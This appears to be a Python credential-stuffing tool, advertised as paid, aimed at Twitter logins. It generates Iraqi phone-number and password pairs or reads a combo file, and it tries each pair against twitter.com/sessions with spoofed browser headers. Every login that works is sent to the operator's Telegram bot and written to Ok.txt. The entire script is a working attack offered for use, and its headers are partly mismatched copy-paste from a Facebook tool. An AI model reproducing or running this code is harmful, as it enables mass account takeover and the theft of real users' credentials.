try:
	import os,sys,time,requests,json
	import random 
	from time import sleep
	from user_agent import generate_user_agent
except ImportError:
	os.system('pip install requests')
	os.system('pip install user_agent')
	

#----------------------------------------------------[colors]----------------------------------------------------#
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
CC = "\033[1;96m"
Q = "("
W = ")"
s=requests.Session()
#----------------------------------------------------[Banner]----------------------------------------------------#
Sidra= """ 
   \033[1;92m  _________                
   \033[1;97m /   _____ 
   \033[1;97m \_____  \   
   \033[1;97m /        \|  
   \033[1;97m/_______   
   \033[1;92m         

\033[1;93m < \033[1;92mTHE TOOL IS PAID\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mNAME TOOL     : MR,VEAR
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB   : NOT
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mVIRSON    : A1
""" 
Tk = f""" {C}

 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄{E} Twitter
{A} ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ░  ░░ ░  ░   ▒   ░        ░ ░░ ░ 
 ░  ░  ░      ░  ░░ ░      ░  ░   
                  ░                                                  
            
\033[1;93m < \033[1;92mTHE TOOL IS PAID\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mNAME TOOL     : MR,VEAR
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB   : NOT
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mVIRSON    : A1
""" 
os.system('clear')

def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
#----------------------------------------------------[Sonofwar_Cod_Checker]----------------------------------------------------#  
os.system('clear')
os.system('rm -rf .txt')
print(Sidra)
token = input(A+"("+E+"⌯"+A+")"+H+ " Enter Token :\n"+C)
ID = input(A+"("+E+"⌯"+A+")"+H+ " Enter ID Tele :\n"+C)
def Cod_SidraELEzz():
	os.system('clear')
	global ID, token 
	ok = 0
	cp = 0
	sk = 0
	print(Tk)
	print("\n"+A+"("+E+"1"+A+")"+C+ " Random Checker Twitter \n"+A+"("+E+"2"+A+")"+C+ " Combo Checker Twitter")
	SidraELEzz=input("\n"+A+"("+E+"⌯"+A+")"+B+ " Choose Checker :"+C)
	if SidraELEzz=="1":
		os.system('clear')
		import time
		def Combo():
			for lik in range(2500):
				kk=random.randint(1000000, 9999999)
				ss=("+964780"+str(kk)+":0780"+str(kk))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ss)+"\n")
				x2=random.randint(1000000, 9999999)
				sos=("+964782"+str(x2)+":0782"+str(x2))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(sos)+"\n")
				sk=random.randint(1000000, 9999999)
				ko=("+964750"+str(sk)+":0750"+str(sk))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ko)+"\n")
				ma=random.randint(1000000, 9999999)
				zki=("+964781"+str(ma)+":0781"+str(ma))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(zki)+"\n")
		Combo()
		fil=".txt"
		file=open(fil,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pw=line.split(':')[1]
			timee = time.asctime()
			Sidraok = ("👩‍💻➥ • ᴛᴡɪᴛᴛᴇʀ ᴀᴄᴄᴏᴜɴᴛ ✓\n. — — — — —  — — — — — . \n📩 ➥• ᴇᴍᴀɪʟ : "+str(user)+"\n📟 ➥• ᴘᴀѕѕᴡᴏʀᴅ : "+str(pw)+"\n⏱ ➥• ᴛɪᴍᴇ : "+str(timee)+"\n. — — — — —  — — — — — . \n👩‍💻➥• @SonOFwAR")
			headers={
    "path": '/',
    "scheme": 'https', 
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2102J20SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
			data={
		    'redirect_after_login': '/',
		    'remember_me': '1',
		    'authenticity_token': '10908ac0975311eb868c135992f7d397',
		    'wfa': '1',
		   'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		   'session[username_or_email]': user,
		   'session[password]': pw}
			
			try:
				req=requests.post(f'https://twitter.com/sessions',headers=headers,data=data)
				time.sleep(0.5)
				if ("ct0") in req.cookies:
					os.system('clear')
					print(Tk)
					ok+=1
					sk+=1
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}30000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
					print(H+"Telegram  "+A+" : "+E+"@Sonofwar")
					
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
					f=open('Ok.txt','a')
					f.write(Sidraok)
					f.close()
				else:
					os.system('clear')
					print(Tk)
					cp+=1
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}30000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
					print(H+"Telegram  "+A+" : "+E+"@vear550")
			except requests.exceptions.ConnectionError:
				print()
				
			except KeyboardInterrupt:
				exit(0)
	elif SidraELEzz=="2":
		os.system('clear')
		import time
		try:
			print(Tk)
			fil= input(A+"("+E+"⌯"+A+")"+H+ " Enter the file Combo :"+C)
		except:
			print("\n Error !!!!!!!!!")
			os.sys.exit()
		file=open(fil,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pw=line.split(':')[1]
			timee = time.asctime()
			Sidraok = ("👩‍💻➥ • ᴛᴡɪᴛᴛᴇʀ ᴀᴄᴄᴏᴜɴᴛ ✓\n. — — — — —  — — — — — . \n📩 ➥• ᴇᴍᴀɪʟ : "+str(user)+"\n📟 ➥• ᴘᴀѕѕᴡᴏʀᴅ : "+str(pw)+"\n⏱ ➥• ᴛɪᴍᴇ : "+str(timee)+"\n. — — — — —  — — — — — . \n👩‍💻➥• @Sonofwar")
			headers={
    "path": '/',
    "scheme": 'https', 
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2102J20SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
			data={
		    'redirect_after_login': '/',
		    'remember_me': '1',
		    'authenticity_token': '10908ac0975311eb868c135992f7d397',
		    'wfa': '1',
		   'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		   'session[username_or_email]': user,
		   'session[password]': pw}
			
			try:
				req=requests.post(f'https://twitter.com/sessions',headers=headers,data=data)
				time.sleep(0.5)
				if ("ct0") in req.cookies:
					os.system('clear')
					print(Tk)
					ok+=1
					sk+=1
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}30000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
					print(H+"Telegram  "+A+" : "+E+"@vear550")
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
					f=open('Ok.txt','a')
					f.write(Sidraok)
					f.close()
				else:
					os.system('clear')
					print(Tk)
					cp+=1
					sk+=1
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}30000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
					print(H+"Telegram  "+A+" : "+E+"@vear550")
			except requests.exceptions.ConnectionError:
				print()
				
			except KeyboardInterrupt:
				exit(0)
Cod_SidraELEzz()
